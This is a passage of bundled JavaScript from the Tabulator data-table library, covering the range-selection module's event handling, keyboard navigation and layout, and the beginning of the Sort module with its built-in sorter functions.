      if (this.options("columns").filter((column) => column.frozen) > 1) {
        console.warn("Having multiple frozen columns with selectRange option may result in unpredictable behavior.");
      }
    }
  }
  initializeTable() {
    this.overlay = document.createElement("div");
    this.overlay.classList.add("tabulator-range-overlay");
    this.rangeContainer = document.createElement("div");
    this.rangeContainer.classList.add("tabulator-range-container");
    this.activeRangeCellElement = document.createElement("div");
    this.activeRangeCellElement.classList.add("tabulator-range-cell-active");
    this.overlay.appendChild(this.rangeContainer);
    this.overlay.appendChild(this.activeRangeCellElement);
    this.table.rowManager.element.addEventListener("keydown", this.keyDownEvent);
    this.resetRanges();
    this.table.rowManager.element.appendChild(this.overlay);
    this.table.columnManager.element.setAttribute("tabindex", 0);
    this.table.element.classList.add("tabulator-ranges");
  }
  initializeWatchers() {
    this.columnSelection = this.options("selectableRangeColumns");
    this.rowSelection = this.options("selectableRangeRows");
    this.subscribe("column-init", this.initializeColumn.bind(this));
    this.subscribe("column-mousedown", this.handleColumnMouseDown.bind(this));
    this.subscribe("column-mousemove", this.handleColumnMouseMove.bind(this));
    this.subscribe("column-resized", this.handleColumnResized.bind(this));
    this.subscribe("column-moving", this.handleColumnMoving.bind(this));
    this.subscribe("column-moved", this.handleColumnMoved.bind(this));
    this.subscribe("column-width", this.layoutChange.bind(this));
    this.subscribe("column-height", this.layoutChange.bind(this));
    this.subscribe("column-resized", this.layoutChange.bind(this));
    this.subscribe("columns-loaded", this.updateHeaderColumn.bind(this));
    this.subscribe("cell-height", this.layoutChange.bind(this));
    this.subscribe("cell-rendered", this.renderCell.bind(this));
    this.subscribe("cell-mousedown", this.handleCellMouseDown.bind(this));
    this.subscribe("cell-mousemove", this.handleCellMouseMove.bind(this));
    this.subscribe("cell-click", this.handleCellClick.bind(this));
    this.subscribe("cell-editing", this.handleEditingCell.bind(this));
    this.subscribe("page-changed", this.redraw.bind(this));
    this.subscribe("scroll-vertical", this.layoutChange.bind(this));
    this.subscribe("scroll-horizontal", this.layoutChange.bind(this));
    this.subscribe("data-destroy", this.tableDestroyed.bind(this));
    this.subscribe("data-processed", this.resetRanges.bind(this));
    this.subscribe("table-layout", this.layoutElement.bind(this));
    this.subscribe("table-redraw", this.redraw.bind(this));
    this.subscribe("table-destroy", this.tableDestroyed.bind(this));
    this.subscribe("edit-editor-clear", this.finishEditingCell.bind(this));
    this.subscribe("edit-blur", this.restoreFocus.bind(this));
    this.subscribe("keybinding-nav-prev", this.keyNavigate.bind(this, "left"));
    this.subscribe("keybinding-nav-next", this.keyNavigate.bind(this, "right"));
    this.subscribe("keybinding-nav-left", this.keyNavigate.bind(this, "left"));
    this.subscribe("keybinding-nav-right", this.keyNavigate.bind(this, "right"));
    this.subscribe("keybinding-nav-up", this.keyNavigate.bind(this, "up"));
    this.subscribe("keybinding-nav-down", this.keyNavigate.bind(this, "down"));
    this.subscribe("keybinding-nav-range", this.keyNavigateRange.bind(this));
  }
  initializeColumn(column) {
    if (this.columnSelection && column.definition.headerSort && this.options("headerSortClickElement") !== "icon") {
      console.warn("Using column headerSort with selectableRangeColumns option may result in unpredictable behavior. Consider using headerSortClickElement: 'icon'.");
    }
    if (column.modules.edit) ;
  }
  updateHeaderColumn() {
    var frozenCols;
    if (this.rowSelection) {
      this.rowHeader = this.table.columnManager.getVisibleColumnsByIndex()[0];
      if (this.rowHeader) {
        this.rowHeader.definition.cssClass = this.rowHeader.definition.cssClass + " tabulator-range-row-header";
        if (this.rowHeader.definition.headerSort) {
          console.warn("Using column headerSort with selectableRangeRows option may result in unpredictable behavior");
        }
        if (this.rowHeader.definition.editor) {
          console.warn("Using column editor with selectableRangeRows option may result in unpredictable behavior");
        }
      }
    }
    if (this.table.modules.frozenColumns && this.table.modules.frozenColumns.active) {
      frozenCols = this.table.modules.frozenColumns.getFrozenColumns();
      if (frozenCols.length > 1 || frozenCols.length === 1 && frozenCols[0] !== this.rowHeader) {
        console.warn("Using frozen columns that are not the range header in combination with the selectRange option may result in unpredictable behavior");
      }
    }
  }
  ///////////////////////////////////
  ///////   Table Functions   ///////
  ///////////////////////////////////
  getRanges() {
    return this.ranges.map((range2) => range2.getComponent());
  }
  getRangesData() {
    return this.ranges.map((range2) => range2.getData());
  }
  addRangeFromComponent(start2, end2) {
    start2 = start2 ? start2._cell : null;
    end2 = end2 ? end2._cell : null;
    return this.addRange(start2, end2);
  }
  ///////////////////////////////////
  /////// Component Functions ///////
  ///////////////////////////////////
  cellGetRanges(cell) {
    var ranges = [];
    if (cell.column === this.rowHeader) {
      ranges = this.ranges.filter((range2) => range2.occupiesRow(cell.row));
    } else {
      ranges = this.ranges.filter((range2) => range2.occupies(cell));
    }
    return ranges.map((range2) => range2.getComponent());
  }
  rowGetRanges(row) {
    var ranges = this.ranges.filter((range2) => range2.occupiesRow(row));
    return ranges.map((range2) => range2.getComponent());
  }
  colGetRanges(col) {
    var ranges = this.ranges.filter((range2) => range2.occupiesColumn(col));
    return ranges.map((range2) => range2.getComponent());
  }
  ///////////////////////////////////
  ////////// Event Handlers /////////
  ///////////////////////////////////
  _handleMouseUp(e2) {
    this.mousedown = false;
    document.removeEventListener("mouseup", this.mouseUpEvent);
  }
  _handleKeyDown(e2) {
    if (!this.blockKeydown && (!this.table.modules.edit || this.table.modules.edit && !this.table.modules.edit.currentCell)) {
      if (e2.key === "Enter") {
        if (this.table.modules.edit && this.table.modules.edit.currentCell) {
          return;
        }
        this.table.modules.edit.editCell(this.getActiveCell());
        e2.preventDefault();
      }
      if ((e2.key === "Backspace" || e2.key === "Delete") && this.options("selectableRangeClearCells")) {
        if (this.activeRange) {
          this.activeRange.clearValues();
        }
      }
    }
  }
  initializeFocus(cell) {
    var range2;
    this.restoreFocus();
    try {
      if (document.selection) {
        range2 = document.body.createTextRange();
        range2.moveToElementText(cell.getElement());
        range2.select();
      } else if (window.getSelection) {
        range2 = document.createRange();
        range2.selectNode(cell.getElement());
        window.getSelection().removeAllRanges();
        window.getSelection().addRange(range2);
      }
    } catch (e2) {
    }
  }
  restoreFocus(element) {
    this.table.rowManager.element.focus();
    return true;
  }
  ///////////////////////////////////
  ////// Column Functionality ///////
  ///////////////////////////////////
  handleColumnResized(column) {
    var selected;
    if (this.selecting !== "column" && this.selecting !== "all") {
      return;
    }
    selected = this.ranges.some((range2) => range2.occupiesColumn(column));
    if (!selected) {
      return;
    }
    this.ranges.forEach((range2) => {
      var selectedColumns = range2.getColumns(true);
      selectedColumns.forEach((selectedColumn) => {
        if (selectedColumn !== column) {
          selectedColumn.setWidth(column.width);
        }
      });
    });
  }
  handleColumnMoving(_event, column) {
    this.resetRanges().setBounds(column);
    this.overlay.style.visibility = "hidden";
  }
  handleColumnMoved(from, _to, _after) {
    this.activeRange.setBounds(from);
    this.layoutElement();
  }
  handleColumnMouseDown(event, column) {
    if (event.button === 2 && (this.selecting === "column" || this.selecting === "all") && this.activeRange.occupiesColumn(column)) {
      return;
    }
    if (this.table.options.movableColumns && this.selecting === "column" && this.activeRange.occupiesColumn(column)) {
      return;
    }
    this.mousedown = true;
    document.addEventListener("mouseup", this.mouseUpEvent);
    this.newSelection(event, column);
  }
  handleColumnMouseMove(e2, column) {
    if (column === this.rowHeader || !this.mousedown || this.selecting === "all") {
      return;
    }
    this.activeRange.setBounds(false, column, true);
  }
  ///////////////////////////////////
  //////// Cell Functionality ///////
  ///////////////////////////////////
  renderCell(cell) {
    var el = cell.getElement(), rangeIdx = this.ranges.findIndex((range2) => range2.occupies(cell));
    el.classList.toggle("tabulator-range-selected", rangeIdx !== -1);
    el.classList.toggle("tabulator-range-only-cell-selected", this.ranges.length === 1 && this.ranges[0].atTopLeft(cell) && this.ranges[0].atBottomRight(cell));
    el.dataset.range = rangeIdx;
  }
  handleCellMouseDown(event, cell) {
    if (event.button === 2 && (this.activeRange.occupies(cell) || (this.selecting === "row" || this.selecting === "all") && this.activeRange.occupiesRow(cell.row))) {
      return;
    }
    this.mousedown = true;
    document.addEventListener("mouseup", this.mouseUpEvent);
    this.newSelection(event, cell);
  }
  handleCellMouseMove(e2, cell) {
    if (!this.mousedown || this.selecting === "all") {
      return;
    }
    this.activeRange.setBounds(false, cell, true);
  }
  handleCellClick(e2, cell) {
    this.initializeFocus(cell);
  }
  handleEditingCell(cell) {
    if (this.activeRange) {
      this.activeRange.setBounds(cell);
    }
  }
  finishEditingCell() {
    this.blockKeydown = true;
    this.table.rowManager.element.focus();
    setTimeout(() => {
      this.blockKeydown = false;
    }, 10);
  }
  ///////////////////////////////////
  ///////     Navigation      ///////
  ///////////////////////////////////
  keyNavigate(dir, e2) {
    if (this.navigate(false, false, dir)) ;
    e2.preventDefault();
  }
  keyNavigateRange(e2, dir, jump, expand) {
    if (this.navigate(jump, expand, dir)) ;
    e2.preventDefault();
  }
  navigate(jump, expand, dir) {
    var moved = false, range2, rangeEdge, prevRect, nextRow, nextCol, row, column, rowRect, rowManagerRect, columnRect, columnManagerRect;
    if (this.table.modules.edit && this.table.modules.edit.currentCell) {
      return false;
    }
    if (this.ranges.length > 1) {
      this.ranges = this.ranges.filter((range3) => {
        if (range3 === this.activeRange) {
          range3.setEnd(range3.start.row, range3.start.col);
          return true;
        }
        range3.destroy();
        return false;
      });
    }
    range2 = this.activeRange;
    prevRect = {
      top: range2.top,
      bottom: range2.bottom,
      left: range2.left,
      right: range2.right
    };
    rangeEdge = expand ? range2.end : range2.start;
    nextRow = rangeEdge.row;
    nextCol = rangeEdge.col;
    if (jump) {
      switch (dir) {
        case "left":
          nextCol = this.findJumpCellLeft(range2.start.row, rangeEdge.col);
          break;
        case "right":
          nextCol = this.findJumpCellRight(range2.start.row, rangeEdge.col);
          break;
        case "up":
          nextRow = this.findJumpCellUp(rangeEdge.row, range2.start.col);
          break;
        case "down":
          nextRow = this.findJumpCellDown(rangeEdge.row, range2.start.col);
          break;
      }
    } else {
      if (expand) {
        if (this.selecting === "row" && (dir === "left" || dir === "right") || this.selecting === "column" && (dir === "up" || dir === "down")) {
          return;
        }
      }
      switch (dir) {
        case "left":
          nextCol = Math.max(nextCol - 1, 0);
          break;
        case "right":
          nextCol = Math.min(nextCol + 1, this.getTableColumns().length - 1);
          break;
        case "up":
          nextRow = Math.max(nextRow - 1, 0);
          break;
        case "down":
          nextRow = Math.min(nextRow + 1, this.getTableRows().length - 1);
          break;
      }
    }
    if (this.rowHeader && nextCol === 0) {
      nextCol = 1;
    }
    if (!expand) {
      range2.setStart(nextRow, nextCol);
    }
    range2.setEnd(nextRow, nextCol);
    if (!expand) {
      this.selecting = "cell";
    }
    moved = prevRect.top !== range2.top || prevRect.bottom !== range2.bottom || prevRect.left !== range2.left || prevRect.right !== range2.right;
    if (moved) {
      row = this.getRowByRangePos(range2.end.row);
      column = this.getColumnByRangePos(range2.end.col);
      rowRect = row.getElement().getBoundingClientRect();
      columnRect = column.getElement().getBoundingClientRect();
      rowManagerRect = this.table.rowManager.getElement().getBoundingClientRect();
      columnManagerRect = this.table.columnManager.getElement().getBoundingClientRect();
      if (!(rowRect.top >= rowManagerRect.top && rowRect.bottom <= rowManagerRect.bottom)) {
        if (row.getElement().parentNode && column.getElement().parentNode) {
          this.autoScroll(range2, row.getElement(), column.getElement());
        } else {
          row.getComponent().scrollTo(void 0, false);
        }
      }
      if (!(columnRect.left >= columnManagerRect.left + this.getRowHeaderWidth() && columnRect.right <= columnManagerRect.right)) {
        if (row.getElement().parentNode && column.getElement().parentNode) {
          this.autoScroll(range2, row.getElement(), column.getElement());
        } else {
          column.getComponent().scrollTo(void 0, false);
        }
      }
      this.layoutElement();
      return true;
    }
  }
  rangeRemoved(removed) {
    this.ranges = this.ranges.filter((range2) => range2 !== removed);
    if (this.activeRange === removed) {
      if (this.ranges.length) {
        this.activeRange = this.ranges[this.ranges.length - 1];
      } else {
        this.addRange();
      }
    }
    this.layoutElement();
  }
  findJumpRow(column, rows2, reverse, emptyStart, emptySide) {
    if (reverse) {
      rows2 = rows2.reverse();
    }
    return this.findJumpItem(emptyStart, emptySide, rows2, function(row) {
      return row.getData()[column.getField()];
    });
  }
  findJumpCol(row, columns, reverse, emptyStart, emptySide) {
    if (reverse) {
      columns = columns.reverse();
    }
    return this.findJumpItem(emptyStart, emptySide, columns, function(column) {
      return row.getData()[column.getField()];
    });
  }
  findJumpItem(emptyStart, emptySide, items, valueResolver) {
    var nextItem;
    for (let currentItem of items) {
      let currentValue = valueResolver(currentItem);
      if (emptyStart) {
        nextItem = currentItem;
        if (currentValue) {
          break;
        }
      } else {
        if (emptySide) {
          nextItem = currentItem;
          if (currentValue) {
            break;
          }
        } else {
          if (currentValue) {
            nextItem = currentItem;
          } else {
            break;
          }
        }
      }
    }
    return nextItem;
  }
  findJumpCellLeft(rowPos, colPos) {
    var row = this.getRowByRangePos(rowPos), columns = this.getTableColumns(), isStartingCellEmpty = this.isEmpty(row.getData()[columns[colPos].getField()]), isLeftOfStartingCellEmpty = columns[colPos - 1] ? this.isEmpty(row.getData()[columns[colPos - 1].getField()]) : false, targetCols = this.rowHeader ? columns.slice(1, colPos) : columns.slice(0, colPos), jumpCol = this.findJumpCol(row, targetCols, true, isStartingCellEmpty, isLeftOfStartingCellEmpty);
    if (jumpCol) {
      return jumpCol.getPosition() - 1;
    }
    return colPos;
  }
  findJumpCellRight(rowPos, colPos) {
    var row = this.getRowByRangePos(rowPos), columns = this.getTableColumns(), isStartingCellEmpty = this.isEmpty(row.getData()[columns[colPos].getField()]), isRightOfStartingCellEmpty = columns[colPos + 1] ? this.isEmpty(row.getData()[columns[colPos + 1].getField()]) : false, jumpCol = this.findJumpCol(row, columns.slice(colPos + 1, columns.length), false, isStartingCellEmpty, isRightOfStartingCellEmpty);
    if (jumpCol) {
      return jumpCol.getPosition() - 1;
    }
    return colPos;
  }
  findJumpCellUp(rowPos, colPos) {
    var column = this.getColumnByRangePos(colPos), rows2 = this.getTableRows(), isStartingCellEmpty = this.isEmpty(rows2[rowPos].getData()[column.getField()]), isTopOfStartingCellEmpty = rows2[rowPos - 1] ? this.isEmpty(rows2[rowPos - 1].getData()[column.getField()]) : false, jumpRow = this.findJumpRow(column, rows2.slice(0, rowPos), true, isStartingCellEmpty, isTopOfStartingCellEmpty);
    if (jumpRow) {
      return jumpRow.position - 1;
    }
    return rowPos;
  }
  findJumpCellDown(rowPos, colPos) {
    var column = this.getColumnByRangePos(colPos), rows2 = this.getTableRows(), isStartingCellEmpty = this.isEmpty(rows2[rowPos].getData()[column.getField()]), isBottomOfStartingCellEmpty = rows2[rowPos + 1] ? this.isEmpty(rows2[rowPos + 1].getData()[column.getField()]) : false, jumpRow = this.findJumpRow(column, rows2.slice(rowPos + 1, rows2.length), false, isStartingCellEmpty, isBottomOfStartingCellEmpty);
    if (jumpRow) {
      return jumpRow.position - 1;
    }
    return rowPos;
  }
  ///////////////////////////////////
  ///////      Selection      ///////
  ///////////////////////////////////
  newSelection(event, element) {
    var range2;
    if (element.type === "column") {
      if (!this.columnSelection) {
        return;
      }
      if (element === this.rowHeader) {
        range2 = this.resetRanges();
        this.selecting = "all";
        var topLeftCell, bottomRightCell = this.getCell(-1, -1);
        if (this.rowHeader) {
          topLeftCell = this.getCell(0, 1);
        } else {
          topLeftCell = this.getCell(0, 0);
        }
        range2.setBounds(topLeftCell, bottomRightCell);
        return;
      } else {
        this.selecting = "column";
      }
    } else if (element.column === this.rowHeader) {
      this.selecting = "row";
    } else {
      this.selecting = "cell";
    }
    if (event.shiftKey) {
      this.activeRange.setBounds(false, element);
    } else if (event.ctrlKey) {
      this.addRange().setBounds(element);
    } else {
      this.resetRanges().setBounds(element);
    }
  }
  autoScroll(range2, row, column) {
    var tableHolder = this.table.rowManager.element, rect, view, withinHorizontalView, withinVerticalView;
    if (typeof row === "undefined") {
      row = this.getRowByRangePos(range2.end.row).getElement();
    }
    if (typeof column === "undefined") {
      column = this.getColumnByRangePos(range2.end.col).getElement();
    }
    rect = {
      left: column.offsetLeft,
      right: column.offsetLeft + column.offsetWidth,
      top: row.offsetTop,
      bottom: row.offsetTop + row.offsetHeight
    };
    view = {
      left: tableHolder.scrollLeft + this.getRowHeaderWidth(),
      right: Math.ceil(tableHolder.scrollLeft + tableHolder.clientWidth),
      top: tableHolder.scrollTop,
      bottom: tableHolder.scrollTop + tableHolder.offsetHeight - this.table.rowManager.scrollbarWidth
    };
    withinHorizontalView = view.left < rect.left && rect.left < view.right && view.left < rect.right && rect.right < view.right;
    withinVerticalView = view.top < rect.top && rect.top < view.bottom && view.top < rect.bottom && rect.bottom < view.bottom;
    if (!withinHorizontalView) {
      if (rect.left < view.left) {
        tableHolder.scrollLeft = rect.left - this.getRowHeaderWidth();
      } else if (rect.right > view.right) {
        tableHolder.scrollLeft = Math.min(rect.right - tableHolder.clientWidth, rect.left - this.getRowHeaderWidth());
      }
    }
    if (!withinVerticalView) {
      if (rect.top < view.top) {
        tableHolder.scrollTop = rect.top;
      } else if (rect.bottom > view.bottom) {
        tableHolder.scrollTop = rect.bottom - tableHolder.clientHeight;
      }
    }
  }
  ///////////////////////////////////
  ///////       Layout        ///////
  ///////////////////////////////////
  layoutChange() {
    this.overlay.style.visibility = "hidden";
    clearTimeout(this.layoutChangeTimeout);
    this.layoutChangeTimeout = setTimeout(this.layoutRanges.bind(this), 200);
  }
  redraw(force) {
    if (force) {
      this.selecting = "cell";
      this.resetRanges();
      this.layoutElement();
    }
  }
  layoutElement(visibleRows) {
    var rows2;
    if (visibleRows) {
      rows2 = this.table.rowManager.getVisibleRows(true);
    } else {
      rows2 = this.table.rowManager.getRows();
    }
    rows2.forEach((row) => {
      if (row.type === "row") {
        this.layoutRow(row);
        row.cells.forEach((cell) => this.renderCell(cell));
      }
    });
    this.getTableColumns().forEach((column) => {
      this.layoutColumn(column);
    });
    this.layoutRanges();
  }
  layoutRow(row) {
    var el = row.getElement(), selected = false, occupied = this.ranges.some((range2) => range2.occupiesRow(row));
    if (this.selecting === "row") {
      selected = occupied;
    } else if (this.selecting === "all") {
      selected = true;
    }
    el.classList.toggle("tabulator-range-selected", selected);
    el.classList.toggle("tabulator-range-highlight", occupied);
  }
  layoutColumn(column) {
    var el = column.getElement(), selected = false, occupied = this.ranges.some((range2) => range2.occupiesColumn(column));
    if (this.selecting === "column") {
      selected = occupied;
    } else if (this.selecting === "all") {
      selected = true;
    }
    el.classList.toggle("tabulator-range-selected", selected);
    el.classList.toggle("tabulator-range-highlight", occupied);
  }
  layoutRanges() {
    var activeCell, activeCellEl, activeRowEl;
    if (!this.table.initialized) {
      return;
    }
    activeCell = this.getActiveCell();
    if (!activeCell) {
      return;
    }
    activeCellEl = activeCell.getElement();
    activeRowEl = activeCell.row.getElement();
    if (this.table.rtl) {
      this.activeRangeCellElement.style.right = activeRowEl.offsetWidth - activeCellEl.offsetLeft - activeCellEl.offsetWidth + "px";
    } else {
      this.activeRangeCellElement.style.left = activeRowEl.offsetLeft + activeCellEl.offsetLeft + "px";
    }
    this.activeRangeCellElement.style.top = activeRowEl.offsetTop + "px";
    this.activeRangeCellElement.style.width = activeCellEl.offsetWidth + "px";
    this.activeRangeCellElement.style.height = activeRowEl.offsetHeight + "px";
    this.ranges.forEach((range2) => range2.layout());
    this.overlay.style.visibility = "visible";
  }
  ///////////////////////////////////
  ///////  Helper Functions   ///////
  ///////////////////////////////////	
  getCell(rowIdx, colIdx) {
    var row;
    if (colIdx < 0) {
      colIdx = this.getTableColumns().length + colIdx;
      if (colIdx < 0) {
        return null;
      }
    }
    if (rowIdx < 0) {
      rowIdx = this.getTableRows().length + rowIdx;
    }
    row = this.table.rowManager.getRowFromPosition(rowIdx + 1);
    return row ? row.getCells(false, true).filter((cell) => cell.column.visible)[colIdx] : null;
  }
  getActiveCell() {
    return this.getCell(this.activeRange.start.row, this.activeRange.start.col);
  }
  getRowByRangePos(pos) {
    return this.getTableRows()[pos];
  }
  getColumnByRangePos(pos) {
    return this.getTableColumns()[pos];
  }
  getTableRows() {
    return this.table.rowManager.getDisplayRows().filter((row) => row.type === "row");
  }
  getTableColumns() {
    return this.table.columnManager.getVisibleColumnsByIndex();
  }
  addRange(start2, end2) {
    var range2;
    if (this.maxRanges !== true && this.ranges.length >= this.maxRanges) {
      this.ranges.shift().destroy();
    }
    range2 = new Range(this.table, this, start2, end2);
    this.activeRange = range2;
    this.ranges.push(range2);
    this.rangeContainer.appendChild(range2.element);
    return range2;
  }
  resetRanges() {
    var range2, cell, visibleCells;
    this.ranges.forEach((range3) => range3.destroy());
    this.ranges = [];
    range2 = this.addRange();
    if (this.table.rowManager.activeRows.length) {
      visibleCells = this.table.rowManager.activeRows[0].cells.filter((cell2) => cell2.column.visible);
      cell = visibleCells[this.rowHeader ? 1 : 0];
      if (cell) {
        range2.setBounds(cell);
        if (this.options("selectableRangeAutoFocus")) {
          this.initializeFocus(cell);
        }
      }
    }
    return range2;
  }
  tableDestroyed() {
    document.removeEventListener("mouseup", this.mouseUpEvent);
    this.table.rowManager.element.removeEventListener("keydown", this.keyDownEvent);
  }
  selectedRows(component) {
    return component ? this.activeRange.getRows().map((row) => row.getComponent()) : this.activeRange.getRows();
  }
  selectedColumns(component) {
    return component ? this.activeRange.getColumns().map((col) => col.getComponent()) : this.activeRange.getColumns();
  }
  getRowHeaderWidth() {
    if (!this.rowHeader) {
      return 0;
    }
    return this.rowHeader.getElement().offsetWidth;
  }
  isEmpty(value) {
    return value === null || value === void 0 || value === "";
  }
}
function number(a, b, aRow, bRow, column, dir, params) {
  var alignEmptyValues = params.alignEmptyValues;
  var decimal = params.decimalSeparator;
  var thousand = params.thousandSeparator;
  var emptyAlign = 0;
  a = String(a);
  b = String(b);
  if (thousand) {
    a = a.split(thousand).join("");
    b = b.split(thousand).join("");
  }
  if (decimal) {
    a = a.split(decimal).join(".");
    b = b.split(decimal).join(".");
  }
  a = parseFloat(a);
  b = parseFloat(b);
  if (isNaN(a)) {
    emptyAlign = isNaN(b) ? 0 : -1;
  } else if (isNaN(b)) {
    emptyAlign = 1;
  } else {
    return a - b;
  }
  if (alignEmptyValues === "top" && dir === "desc" || alignEmptyValues === "bottom" && dir === "asc") {
    emptyAlign *= -1;
  }
  return emptyAlign;
}
function string(a, b, aRow, bRow, column, dir, params) {
  var alignEmptyValues = params.alignEmptyValues;
  var emptyAlign = 0;
  var locale;
  if (!a) {
    emptyAlign = !b ? 0 : -1;
  } else if (!b) {
    emptyAlign = 1;
  } else {
    switch (typeof params.locale) {
      case "boolean":
        if (params.locale) {
          locale = this.langLocale();
        }
        break;
      case "string":
        locale = params.locale;
        break;
    }
    return String(a).toLowerCase().localeCompare(String(b).toLowerCase(), locale);
  }
  if (alignEmptyValues === "top" && dir === "desc" || alignEmptyValues === "bottom" && dir === "asc") {
    emptyAlign *= -1;
  }
  return emptyAlign;
}
function datetime(a, b, aRow, bRow, column, dir, params) {
  var DT = this.table.dependencyRegistry.lookup(["luxon", "DateTime"], "DateTime");
  var format = params.format || "dd/MM/yyyy HH:mm:ss", alignEmptyValues = params.alignEmptyValues, emptyAlign = 0;
  if (typeof DT != "undefined") {
    if (!DT.isDateTime(a)) {
      if (format === "iso") {
        a = DT.fromISO(String(a));
      } else {
        a = DT.fromFormat(String(a), format);
      }
    }
    if (!DT.isDateTime(b)) {
      if (format === "iso") {
        b = DT.fromISO(String(b));
      } else {
        b = DT.fromFormat(String(b), format);
      }
    }
    if (!a.isValid) {
      emptyAlign = !b.isValid ? 0 : -1;
    } else if (!b.isValid) {
      emptyAlign = 1;
    } else {
      return a - b;
    }
    if (alignEmptyValues === "top" && dir === "desc" || alignEmptyValues === "bottom" && dir === "asc") {
      emptyAlign *= -1;
    }
    return emptyAlign;
  } else {
    console.error("Sort Error - 'datetime' sorter is dependant on luxon.js");
  }
}
function date$2(a, b, aRow, bRow, column, dir, params) {
  if (!params.format) {
    params.format = "dd/MM/yyyy";
  }
  return datetime.call(this, a, b, aRow, bRow, column, dir, params);
}
function time(a, b, aRow, bRow, column, dir, params) {
  if (!params.format) {
    params.format = "HH:mm";
  }
  return datetime.call(this, a, b, aRow, bRow, column, dir, params);
}
function boolean(a, b, aRow, bRow, column, dir, params) {
  var el1 = a === true || a === "true" || a === "True" || a === 1 ? 1 : 0;
  var el2 = b === true || b === "true" || b === "True" || b === 1 ? 1 : 0;
  return el1 - el2;
}
function array(a, b, aRow, bRow, column, dir, params) {
  var type = params.type || "length", alignEmptyValues = params.alignEmptyValues, emptyAlign = 0, table = this.table, valueMap;
  if (params.valueMap) {
    if (typeof params.valueMap === "string") {
      valueMap = function(value) {
        return value.map((item) => {
          return Helpers.retrieveNestedData(table.options.nestedFieldSeparator, params.valueMap, item);
        });
      };
    } else {
      valueMap = params.valueMap;
    }
  }
  function calc(value) {
    var result;
    if (valueMap) {
      value = valueMap(value);
    }
    switch (type) {
      case "length":
        result = value.length;
        break;
      case "sum":
        result = value.reduce(function(c, d3) {
          return c + d3;
        });
        break;
      case "max":
        result = Math.max.apply(null, value);
        break;
      case "min":
        result = Math.min.apply(null, value);
        break;
      case "avg":
        result = value.reduce(function(c, d3) {
          return c + d3;
        }) / value.length;
        break;
      case "string":
        result = value.join("");
        break;
    }
    return result;
  }
  if (!Array.isArray(a)) {
    emptyAlign = !Array.isArray(b) ? 0 : -1;
  } else if (!Array.isArray(b)) {
    emptyAlign = 1;
  } else {
    if (type === "string") {
      return String(calc(a)).toLowerCase().localeCompare(String(calc(b)).toLowerCase());
    } else {
      return calc(b) - calc(a);
    }
  }
  if (alignEmptyValues === "top" && dir === "desc" || alignEmptyValues === "bottom" && dir === "asc") {
    emptyAlign *= -1;
  }
  return emptyAlign;
}
function exists(a, b, aRow, bRow, column, dir, params) {
  var el1 = typeof a == "undefined" ? 0 : 1;
  var el2 = typeof b == "undefined" ? 0 : 1;
  return el1 - el2;
}
function alphanum(as, bs, aRow, bRow, column, dir, params) {
  var a, b, a1, b1, i2 = 0, L, rx = /(\d+)|(\D+)/g, rd = /\d/;
  var alignEmptyValues = params.alignEmptyValues;
  var emptyAlign = 0;
  if (!as && as !== 0) {
    emptyAlign = !bs && bs !== 0 ? 0 : -1;
  } else if (!bs && bs !== 0) {
    emptyAlign = 1;
  } else {
    if (isFinite(as) && isFinite(bs)) return as - bs;
    a = String(as).toLowerCase();
    b = String(bs).toLowerCase();
    if (a === b) return 0;
    if (!(rd.test(a) && rd.test(b))) return a > b ? 1 : -1;
    a = a.match(rx);
    b = b.match(rx);
    L = a.length > b.length ? b.length : a.length;
    while (i2 < L) {
      a1 = a[i2];
      b1 = b[i2++];
      if (a1 !== b1) {
        if (isFinite(a1) && isFinite(b1)) {
          if (a1.charAt(0) === "0") a1 = "." + a1;
          if (b1.charAt(0) === "0") b1 = "." + b1;
          return a1 - b1;
        } else return a1 > b1 ? 1 : -1;
      }
    }
    return a.length > b.length;
  }
  if (alignEmptyValues === "top" && dir === "desc" || alignEmptyValues === "bottom" && dir === "asc") {
    emptyAlign *= -1;
  }
  return emptyAlign;
}
var defaultSorters = {
  number,
  string,
  date: date$2,
  time,
  datetime,
  boolean,
  array,
  exists,
  alphanum
};
class Sort extends Module {
  static moduleName = "sort";
  //load defaults
  static sorters = defaultSorters;
  constructor(table) {
    super(table);
    this.sortList = [];
    this.changed = false;
    this.registerTableOption("sortMode", "local");
    this.registerTableOption("initialSort", false);
    this.registerTableOption("columnHeaderSortMulti", true);
    this.registerTableOption("sortOrderReverse", false);
    this.registerTableOption("headerSortElement", "<div class='tabulator-arrow'></div>");
    this.registerTableOption("headerSortClickElement", "header");
    this.registerColumnOption("sorter");
    this.registerColumnOption("sorterParams");
    this.registerColumnOption("headerSort", true);
    this.registerColumnOption("headerSortStartingDir");
    this.registerColumnOption("headerSortTristate");
  }
  initialize() {
    this.subscribe("column-layout", this.initializeColumn.bind(this));
    this.subscribe("table-built", this.tableBuilt.bind(this));
    this.registerDataHandler(this.sort.bind(this), 20);
    this.registerTableFunction("setSort", this.userSetSort.bind(this));
    this.registerTableFunction("getSorters", this.getSort.bind(this));
    this.registerTableFunction("clearSort", this.clearSort.bind(this));
    if (this.table.options.sortMode === "remote") {
      this.subscribe("data-params", this.remoteSortParams.bind(this));
    }
  }
  tableBuilt() {
    if (this.table.options.initialSort) {
      this.setSort(this.table.options.initialSort);
    }
  }
  remoteSortParams(data, config, silent, params) {
    var sorters = this.getSort();
    sorters.forEach((item) => {
      delete item.column;
    });
    params.sort = sorters;
    return params;
  }
  ///////////////////////////////////
  ///////// Table Functions /////////
  ///////////////////////////////////
  userSetSort(sortList, dir) {
    this.setSort(sortList, dir);
    this.refreshSort();
  }
  clearSort() {
    this.clear();
    this.refreshSort();
  }
  ///////////////////////////////////
  ///////// Internal Logic //////////
  ///////////////////////////////////
  //initialize column header for sorting
  initializeColumn(column) {
    var sorter = false, colEl, arrowEl;
    switch (typeof column.definition.sorter) {
      case "string":
        if (Sort.sorters[column.definition.sorter]) {
          sorter = Sort.sorters[column.definition.sorter];
        } else {
          console.warn("Sort Error - No such sorter found: ", column.definition.sorter);
        }
        break;
      case "function":
        sorter = column.definition.sorter;
        break;
    }
    column.modules.sort = {
      sorter,
      dir: "none",
      params: column.definition.sorterParams || {},
      startingDir: column.definition.headerSortStartingDir || "asc",
      tristate: column.definition.headerSortTristate
    };
    if (column.definition.headerSort !== false) {
      colEl = column.getElement();
      colEl.classList.add("tabulator-sortable");
      arrowEl = document.createElement("div");
      arrowEl.classList.add("tabulator-col-sorter");
      switch (this.table.options.headerSortClickElement) {
        case "icon":
          arrowEl.classList.add("tabulator-col-sorter-element");
          break;
        case "header":
          colEl.classList.add("tabulator-col-sorter-element");
          break;
        default:
          colEl.classList.add("tabulator-col-sorter-element");
          break;
      }
      switch (this.table.options.headerSortElement) {
        case "function":
          break;
        case "object":
